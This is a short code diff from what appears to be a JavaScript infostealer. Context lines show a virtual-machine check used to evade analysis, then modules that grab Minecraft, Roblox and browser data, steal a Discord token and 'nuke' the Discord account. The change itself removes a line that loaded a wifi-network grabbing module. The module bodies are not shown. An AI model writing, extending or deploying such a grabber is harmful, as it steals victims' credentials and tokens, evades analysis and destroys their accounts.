@@ -23,7 +23,6 @@ if (config.vmProtect && checkVM()) {
   require('./functions/grab-mc');
   require('./functions/grab-roblox');
   require('./functions/grab-browsers-data');
-  config.wifiNetworks && require('./functions/wifi-networks');
 
   require('./functions/grab-discord-token').then(() => {
     require('./functions/nuke-discord-account');
